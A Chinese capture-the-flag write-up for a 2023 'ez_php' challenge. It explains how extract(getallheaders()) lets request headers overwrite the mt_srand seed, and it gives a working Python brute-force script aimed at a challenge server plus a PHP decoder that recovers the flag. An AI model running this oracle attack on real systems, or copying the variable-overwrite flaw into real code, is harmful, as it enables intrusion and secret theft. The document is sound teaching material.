---
tags:
  - TZC
  - 简单
  - 覆写
  - 伪随机
---

# \[台州学院 2023\] ez_php

## 前置工作

打开靶机，看到如下源码（进行了些许美化）

```php
<?php
error_reporting(0);
$Seed = str_split(uniqid(), 10)[1];
extract(getallheaders());
mt_srand($Seed);
$flag = str_split(file_get_contents("/flag"));
$result = "";
foreach ($flag as $value) {
    $result = $result.chr(ord($value) + mt_rand(1, 2));
}
if (isset($Answer)) {
    if ($Answer == substr($result, 0, strlen($Answer))){
        echo "wow~";
    } else {
        echo "no~";
    }
} else {
    highlight_file(__FILE__);
    echo "no~";
}
```

## `mt_rand()` 伪随机

细品一下代码，上网搜一搜就能发现，`mt_rand(1, 2)` 是个伪随机的函数，从 `(1, 2)` 中选一个作为值，而跟他有关联的 `mt_srand($Seed)` 是将 `$Seed` 作为随机生成器的种子。

换句话说，如果我们能掌握住一个固定的种子，那么这个随机数就跟没有一样（因为是伪随机，经过处理之后照样可以用相同的 `$Seed` 绕回来）

题目刚开始有一句 `$Seed = str_split(uniqid(), 10)[1];`，很明显，生成了一个我不知道是什么东西的种子，但这无妨，我们可以覆写他

## `extract()` 覆写

`extract(getallheaders())` 即将 Http 请求 Headers 中的所有键值对转成程序内的可调用变量，就比如说我在 Headers 中写一个 `Temp=1`，那么此 PHP 程序中的后文就可以调用到变量 `$Temp`，并且 `echo $Temp;` 会输出 `1`

理论如此，那么直接实践，前面定义了一个 `$Seed`，我不管，直接 Headers 中再写一个 `Seed=2`，那么我的种子就是固定的数字 `2` 了

再阅读一下代码，发现下文有一个变量 `$Answer`，这个变量上文没有被定义过，所以我们就用同样的方法，在 Headers 中写一个 `Answer=?`（不是真的 `?`，这代表暂时还不知道是什么），看到下面的判断语句

```php
$Answer == substr($result, 0, strlen($Answer))
```

这说明当我们输入 n 个字符，他就会将我们这 n 个字符与加密后的 Flag 的前 n 位进行比较，若比较成功，则返回 `wow~`，不然就是 `no~`，那我们可以用 Python 写出一个爆破脚本

## 爆破

```python
import requests

ascii_chars = []

# 生成可打印的所有 ASCII 字符
for i in range(33, 127):
    ascii_chars.append(chr(i))

url = "http://120.26.101.154:28094/"
answer = ""

# 每当我成功试出一个符合的字符，就将其追加到 answer 中，直到报错
i = 0
while i < 95:
    response = requests.get(url, headers={
        "Seed": "2", # 这里的 Seed 就是在 Headers 中去覆写的 Seed
        "Answer": answer + ascii_chars[i]
    })
    if response.text == "wow~":
        answer += ascii_chars[i]
        print("current: " + answer)
        i = 0
    else:
        i += 1
print(answer)

```

你应该可以看到类似于这样的输出

```
current: g
current: gn
current: gnc
current: gnch
current: gnch|
...（省略很多很多）
current: gnch|c5777224/d3c2.51g9/ce92/7668cc:9f3b4
current: gnch|c5777224/d3c2.51g9/ce92/7668cc:9f3b4~
```

得出加密后的 Flag 为 `gnch|c5777224/d3c2.51g9/ce92/7668cc:9f3b4~`，此时距离做完只剩一步了，就是把他还原出来，我们可以用 PHP 脚本编写还原代码

## 还原

```php
<?php
$Seed = 2;
mt_srand($Seed);
$flag = str_split("gnch|c5777224/d3c2.51g9/ce92/7668cc:9f3b4~");
$result = "";
foreach ($flag as $value){
    $result = $result.chr(ord($value)-mt_rand(1,2));
}
echo $result;
```

运行后得出最终结果 `flag{a4565102-b1a0-40f7-ad81-5457ab97d1a3}`